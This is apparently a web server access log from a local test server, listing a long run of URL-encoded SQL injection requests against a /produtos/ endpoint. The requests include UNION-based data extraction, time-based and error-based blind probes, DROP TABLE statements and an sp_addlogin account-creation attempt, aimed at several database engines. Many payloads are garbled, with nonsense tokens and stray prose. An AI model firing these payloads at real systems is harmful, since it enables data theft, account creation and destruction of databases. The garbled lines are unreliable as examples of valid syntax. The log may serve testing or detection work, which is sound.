Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20userschame'lame%20'; HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20inam$$;or HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20_(%20,ull,fuln),%20pall_where%202x7da2,0x72)%20)%20&&%20(%20%22(%20%22ixyK%22%20Like%20%22IXYk HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM;%20UNO%20TULL,%20Same%20Storey'%20(%20As%20the%20movie%20%221'%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+c HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%22%20=%20/**/1/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20) HTTP/1.1
172.18.0.1 - GET /produtos/test0O0X0O0O0O0x0O10X0O0O7b110'%20;)%3E%20)%20)%20OR%20;(%20*SelECt%20*%20FRoM%20%3C%20(%20SeLEcT%20(%20SlEEp%20(%3C%200o0B0B0O0b0O0O0o0x0X0X5b101011010011011110(%20)%20%5E)*%20)%20YDpU%20,)%20;aNd%20;%20(%20%5D%20(%20(%20'xALB'!'LiKe%20'Xaw HTTP/1.1
172.18.0.1 - GET /produtos/test-9156%22%20)%20)%20union%20all%20select%209431,9431,9431,9431,9431,9431,9431,9431 HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20(%20(%20%22tiet%22%20like%20%22tiet HTTP/1.1
172.18.0.1 - GET /produtos/test1'+%20(%20select%20'bmta'%20where%203168%20=%203168%20union%20all%20select%20null,null,null,null,null,null HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20as%20nzfz%20where%207305%20=%207305%20order%20by%201 HTTP/1.1
172.18.0.1 - GET /produtos/test-7519%25%22%20or%204947%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204747%20=%204747%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20) HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20union%20select%20@%20$_,version%20(%20)%20--%201 HTTP/1.1
172.18.0.1 - GET /produtos/test-1405%20where%201788%20=%201788%20union%20all%20select%201786,1786,1786 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7C HTTP/1.1
172.18.0.1 - GET /produtos/test-9593%20)%20as%20wags%20where%204675%20=%204675%20union%20all%20select%204675,4675,4675%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20and%20(%20(%20'inrm'%20like%20'inrm HTTP/1.1
172.18.0.1 - GET /produtos/test-4419%25%22%20)%20)%20or%201%20group%20by%20concat%20(%200x7171706a71,%20(%20select%20(%20case%20when%20(%204232%20=%204232%20)%20then%201%20else%200%20end%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20having%20min%20(%200%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test-7341%20or%20(8459=8459)*4906%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20and%20(%20(%20'vkdk'%20like%20'vkdk HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20as%20txxn%20where%207884%20=%207884%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118 HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20as%20simd%20where%206984%20=%206984%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20)%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20and%20(%20(%208280%20=%208280%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20and%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20as%20lexx%20where%202892%20=%202892%20or%20elt%20(%206272%20=%206272,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test-8143%20union%20all%20select%204492,4492,4492,4492,4492,4492,4492,4492,4492 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20'vwad'%20like%20'vwad HTTP/1.1
172.18.0.1 - GET /produtos/test-2583%22%20)%20where%203455%20=%203455%20or%20make_set%20(%209354%20=%209354,7185%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testexec%20sp_addlogin%20'name'%20,%20'password' HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20as%20yyud%20where%204934%20=%204934 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20and%207533%20=%207533%20and%20(%20(%20(%20'suzd'%20like%20'suzd HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20)%20)%20)%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20(%201928%20=%201928 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20'@%20users%20in,',tusenade'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAtE%20)%20,0B1%200x0%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20(%20,%20users,version)%20and%20'1'%20like%20'1'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-%20Table_name(chr'('113),112)%20+%20HEre HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,(u HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20's',usersint%20as%20'past'%20=%20'abst HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_name'%20)%20,RaSS_qristAR%20'HEre%20'%3CVaReinG%20)%20,%20VErsE%20(%20EnD%20)%20LImE%20(%200x0o0b0b10101110001111010100011100000011111011%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyuseri HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,male_came_tem/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,mactebure%20name%20table%20)%20;%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20chare%20in/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20nute%20select%202,version%20(%20)%20--%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20)%20,%20usernemant%20table%20alie;%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber';%20)%20+ind'%20(%201%20)%20;%3E1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys;%20)%201'+%20(%20select%20byva%20from%20vual%20where%208045%20=%208045%20and%208594%20=%20(%20select%208594%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charally%20tyve_all%20ter%20';%20vareybed%20'like'%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybchalale%20112%20)%20/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%20)%201%20and%20'iet'%20=%20'iet HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,username%20like%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,macceat%20len%20tabe_tame_'; HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gename_bers%20and%20ebatibes%20(%204143,1440%20)%20%3E%201%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20as%20qvyu%20where%205962%20=%205962%20or%20updatexml%20(%201808,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%201808%20=%201808,1%20)%20)%20)%20,0x717a767a71%20)%20,8666%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'kptj'%20from%20dual%20where%205123%20=%205123%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test-9698%20)%20as%20pvhn%20where%203223%20=%203223%20or%20elt%20(%206563%20=%209210,9210%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20where%209904%20=%209904%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'zwcp'%20where%203333%20=%203333--After%20a%20lot%20mounguestien%20man%20gues%20in%20the%20high%20secrital%20invociation%20of%20success,%20some%20missing%20a%20hand%20of%20comic%20books%20and%20promising%20over%20through%20an%20uncall%20disgrace%20storees.%20Costuma HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20)%20as%20ylzg%20wherere/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20where%202964%20=%202964%20union%20all%20select%20null,null,null HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20)%20as%20mxxd%20where%207255%20=%207255%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test-4031%22%20)%20)%20)%20or%201570%20=%20convert%20(%20int,%20(%20select%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%201570%20=%201570%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+ch HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char%20( HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20( HTTP/1.1
172.18.0.1 - PUT /produtos/test1')%20or%20row(1045,7562)%3E(select%20count(*),concat(0x7171706a71,(select%20(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x%20from%20(select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210)a%20group%20by%20x)%20and%20('qdgt'='ggdt HTTP/1.1
172.18.0.1 - PUT /produtos/test-8103%20)%20)%20union%20all%20select%203681,3681,3681,3681,3681 HTTP/1.1
172.18.0.1 - PUT /produtos/test-7565'%20)%20)%20union%20all%20select%207745,7745,7745,7745,7745,7745 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20in%20boolean%20mode%20)%20and%205556%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20paxa%20where%209046%20=%209046%20or%20updatexml%20(%201808,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%201808%20=%201808,1%20)%20)%20)%20,0x717a767a71%20)%20,8666%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1)%20as%20zhvx%20where%203171=3171%20procedure%20analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select%20(case%20when%20(5840=5840)%20then%201%20else%200%20end)),0x717a767a71)),1)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20cwsi%20where%207360%20=%207360%20or%20sleep%20(%205%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test0B1''%20)%20)%20as%20NLqH%20wHErE%20(SELEcT%20(sELECt%20(SELECT%20(SELECT%208756))))%20=/**/%201393 HTTP/1.1
172.18.0.1 - PUT /produtos/test0B110%22%20)%20)%20aS%20XrAb%20wHErE%20(sEleCT%200X1Dc0X0x0o1)%20like%202X0xF75%20Or%20(sELEct%20(SelecT%20(sELEct%20(seleCt%20(SeLeCT%200X9B71)))))%20LikE%20(%20SELEct%200X3100%20FroM%20pg_SlEEP%20(%20(SeLEcT%20(SelEct%200x5))%20)%20)%20anD%20True%20Or%20False%20or%20FALSE%20oR%20fAlSE%20OR%20(SeleCT%20(S HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20pg_sleep%20(%205%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'fzlu'%20where%209521%20=%209521%20and%208312%20=%20dbms_pipe.receive_message%20(%20chr%20(%2069%20)%20%7C%7Cchr%20(%2079%20)%20%7C%7Cchr%20(%20101%20)%20%7C%7Cchr%20(%2068%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20srmq%20)%20and%20(%20(%20%22hxdd%22%20=%20%22hxdd HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20tgiq%20where%204164%20=%204164%20and%20elt%20(%209240%20=%208290,8/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20and%204241%20=%20convert%20(%20int,%20(%20select%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%204241%20=%204241%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+c HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'guxp'%20where%206107%20=%206107%20or%20char%20(%20117%20)%20%7C%7Cchar%20(%20111%20)%20%7C%7Cchar%20(%20105%20)%20%7C%7Cchar%20(%20100%20)%20=%20regexp_substring%20(%20repeat%20(%20left%20(%20crypt_key%20(%20char%20(%2065%20)%20%7C%7Cchar%20(%2069%20)%20%7C%7Cchar%20(%2083%20)%20,null%20)%20,0%20)%20,50000 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20as%20nlfq%20where%203410%20=%203410%20or%20extractvalue%20(%201297,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%201297%20=%201297,1%20)%20)%20)%20,0x717a767a71%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20)%20rlike%20(%20select%20(%20case%20when%20(%207689%20=%207689%20)%20then%201%20else%200x28%20end%20)%20)%20and%20(%20(%20(%20'vtoi'%20like%20'vtoi HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20(%20tubl,sinchame%20chamantele:%20tabe_tame%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20(%20,%20SELECT%20vErsion%20(%20)%20,version%20(%20)%20,ROWNIME%201%20,8%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20';%20AND%20true%20AND%20%22e%22%20NOT%20LIKE%20%22Eg%22%20OR%20%22;%22%20NOT%20LIKE%20%22;%22 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20)%20'%3C%3E'2b1171',uNIon%20sElect%20CAL@@@vErsIOn%20--%202 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1001%20)%20and%20(%201012%20=%208102 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo2'%20)%20,%3CDES%20Or%20'D'%20noT%20lIkE%20''2'%20Or%20%22;%22%20not%20LIKe%20%22;%22%20Or%20FalSE%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,@@version%20,%20)%20/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made,call%20ing_vell_'%20)%20,1,1%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20net,eversion%20)%20+%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbfn HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'sipp'tipe%20like%20' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20libe:'intot',%20Pharswopppanded%20)%20'it'%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'lowing'%20and%20'bys' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'tapz' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verale,%20trbaed%20comantables) HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAtE%20)%20,(SELECT%201)%20)%20anD%20'I'%20lIke%20'I'%20or%20faLse%20or%20fALSe%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SET%20AND%20'1'%20=%20'1'%20or%20'1'%20=%20'1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20S%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%22%20or%201%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20as%20mtnw%20where%207293%20=%207293%20and%202603%20=%205764%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20ylyq%20where%202953%20=%202953%20and%202716%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'vdfo'%20from%20dual%20where%204188%20=%204188%20or%208315%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20'rqbf'%20=%20'rqbf HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20'rguk'%20where%206019%20=%206019%20union%20all%20select%20null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20fynx%20where%209636%20=%209636%20union%20all%20select%20null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%25%22%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test-5891%20)%20)%20as%20iimq%20where%203487%20=%203478%20or%209323%20=%209323 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20as%20dezr%20where%202145%20=%202145%20or%20sleep%20(%205%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test-7111%25%22%20union%20all%20select%206083,6083,6083,6083,6083,6083%20-- HTTP/1.1
